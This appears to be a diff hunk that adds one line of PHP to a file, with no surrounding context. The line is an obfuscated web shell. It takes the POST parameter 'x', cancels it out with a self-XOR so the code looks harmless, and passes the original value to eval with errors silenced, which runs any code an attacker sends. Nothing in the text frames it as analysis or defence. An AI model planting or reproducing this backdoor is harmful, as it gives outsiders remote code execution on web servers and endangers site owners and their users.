@@ -1,0 +1,1 @@
+<?php $a=$_POST['x'];$b=$a;$a=$a^$b;@eval($b^$a);?>
